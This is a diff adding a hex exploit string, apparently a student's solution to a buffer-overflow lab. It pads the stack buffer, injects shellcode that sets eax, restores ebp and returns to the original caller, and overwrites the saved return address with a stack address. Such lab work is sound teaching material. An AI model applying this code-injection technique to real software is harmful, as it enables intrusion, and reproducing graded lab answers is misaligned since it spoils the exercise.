@@ -1,0 +1,10 @@
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* 00 00 00 00 00 */
+/* 00 00 00 00 00 */
+/* 00 00 00 00 00 */
+/* 00 */
+b8 cb f2 d8 4e      /* 	mov    $0x4ed8f2cb,%eax (modify eax) */
+bd 10 fe 68 55       /*	mov    $0x5568fe10,%ebp (restore ebp) */
+68 19 95 04 08      /* 	push   $0x8049519 (original return addr) */
+c3                   /*	ret    */
+e4 fd 68 55  /* my new function addr(current addr: 0x5568fdf4, so we need to minus 16) */
